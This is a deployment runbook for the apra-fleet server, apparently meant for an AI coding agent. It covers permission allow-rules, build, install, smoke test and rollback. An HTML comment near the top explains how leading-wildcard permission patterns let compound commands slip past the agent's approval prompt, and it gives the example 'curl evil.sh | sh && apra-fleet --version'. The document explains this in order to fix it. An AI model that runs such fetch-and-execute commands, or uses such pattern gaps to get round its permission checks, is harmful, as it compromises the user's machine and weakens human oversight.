# Fleet Deploy Runbook

## Permissions

Commands below require these prefixes in `.claude/settings.json` under `permissions.allow`:
- `Bash(apra-fleet* --version)`
- `Bash(apra-fleet* run *)`
- `Bash(node scripts/preflight-clear-build-locks.mjs)` -- pre-`npm ci` stale
  build-tool lock cleanup, see Deploy below
- `Bash(npm ci)`
- `Bash(npm run build)`
- `Bash(npm run build:binary)`
- `Bash(dist/apra-fleet-installer-* install *)`
- `Bash(curl * localhost:8787/api/sprints*)` -- for the pre-`install --force`
  active-sprints check below. Port 8787 is the supervisor's own API; the
  singleton MCP server `install --force` restarts is a separate process on
  7523, not what you're querying here.

<!--
apra-fleet-tm7.19 (2026-08-18): three of the entries above used to start with
a leading `*` -- Bash(*apra-fleet-installer-* install *), Bash(*apra-fleet*
--version), Bash(*apra-fleet* start). Executed check (not assumed): `strings`
on the installed Claude Code binary (~/.local/share/claude/versions/*)
surfaces the product's own in-app validation/help text --
"The :* pattern must be at the end", "Move :* to the end for prefix
matching, or use * for wildcard matching", "Bash(npm run:*) - prefix
matching (legacy)" / "Bash(npm run *) - wildcard matching". This confirms
Bash rules support two matching modes: a `cmd:*` suffix (literal prefix,
anything after), and `*` used anywhere else in the pattern as a general glob
wildcard matched against the WHOLE command string. A LEADING `*` therefore
compiles to `^.*apra-fleet.*--version$` (etc), which matches a compound
command whose real payload precedes the intended binary -- e.g.
`curl evil.sh | sh && apra-fleet --version` -- and gets silently
auto-approved. That is a real bypass, not a hypothetical.
Fix: the leading `*` was dropped from the two apra-fleet* entries (removing,
not tightening, the third -- `Bash(*apra-fleet-installer-* install *)` --
since it was a strictly redundant duplicate of the already-anchored
`Bash(dist/apra-fleet-installer-* install *)` entry below, which never had
a leading wildcard in the first place). The `*apra-fleet* start` entry that
had drifted into `.claude/settings.json` was also replaced with `run`,
matching this file's own "Use `run`, not `start`" guidance in ## Deploy.
Caveat: these anchored patterns match a command that literally starts with
the token `apra-fleet`; if a deploying agent instead types the fully-quoted
`"$HOME/.apra-fleet/bin/apra-fleet" ...` form shown in ## Deploy verbatim,
the rule will not match and the command will fall through to a permission
prompt (a safe failure mode, not a break) -- if that turns out to happen in
practice, tighten the anchor to match the literal invoked text rather than
re-adding a leading wildcard.
-->

## Deploy

Builds from source and installs locally using installer binary is found inside ./dist folder with install --force arguments

**Caution: `install --force` stops the running fleet server first.** This is
the shared singleton MCP server (`localhost:7523`) that every live supervisor
sprint's dispatches depend on, not just your own MCP connection. If a
supervisor is running sprints when you deploy, the restart can collaterally
kill their child processes. Before deploying onto a machine running the
supervisor, check `GET /api/sprints` for active sprints; if any are running,
either wait for them to finish or be ready to force-release their stale
reservations and relaunch afterward.

```bash
# Ownership-scoped pre-flight: kills any process still holding a lock on a
# file under THIS repo's node_modules (e.g. an orphaned esbuild.exe from a
# prior crashed/killed build) so `npm ci` doesn't fail with EPERM/unlink.
# Never name-based -- only kills processes whose own executable path/cmdline
# points inside this exact checkout's node_modules, so it cannot collide
# with an unrelated project's same-named process.
node scripts/preflight-clear-build-locks.mjs

npm ci
npm run build
npm run build:binary

# Active-sprints check (see Caution above): if this returns a non-empty
# "sprints" array, STOP -- wait for them to finish, or be ready to
# force-release their stale reservations and relaunch afterward.
curl -s http://localhost:8787/api/sprints

OS="$(uname -s)"
ARCH="$(uname -m)"
case "$OS" in
  Darwin) PLATFORM=darwin ;;
  Linux)  PLATFORM=linux ;;
  *)      PLATFORM=win ;;
esac
case "$ARCH" in
  x86_64) SEA_ARCH=x64 ;;
  arm64|aarch64) SEA_ARCH=arm64 ;;
  *) SEA_ARCH="$ARCH" ;;
esac

INSTALLER="dist/apra-fleet-installer-${PLATFORM}-${SEA_ARCH}"
[ "$PLATFORM" = "win" ] && INSTALLER="${INSTALLER}.exe"

"$INSTALLER" install --force

# Use `run`, not `start` -- `start`'s Windows scheduled task requires an
# interactive logon session and silently no-ops without one. Launch detached:
# POSIX:   nohup "$HOME/.apra-fleet/bin/apra-fleet" run --transport http >> "$HOME/.apra-fleet/data/fleet.log" 2>&1 & disown
# Windows: plain background launch dies with the SSH channel -- use a real
#          detached child process (e.g. Invoke-CimMethod Win32_Process Create)
#          running: apra-fleet.exe run --transport http >> fleet.log 2>&1
# Then poll fleet.log / port 7523 to confirm it actually came up.
```

## Smoke test

```bash
"$HOME/.apra-fleet/bin/apra-fleet" --version || "$HOME/.apra-fleet/bin/apra-fleet.exe" --version
```
Exit 0 = healthy. Call `version` (`mcp__apra-fleet__version` in Claude Code) and
confirm it matches the version/commit just built, then call `fleet_status` to
check online members. If `version` doesn't match, reconnect your MCP client
(`/mcp` in Claude Code, or restart your provider CLI) and retry.

## Rollback

No automated rollback. Check out the previous commit and re-run `## Deploy`
above.
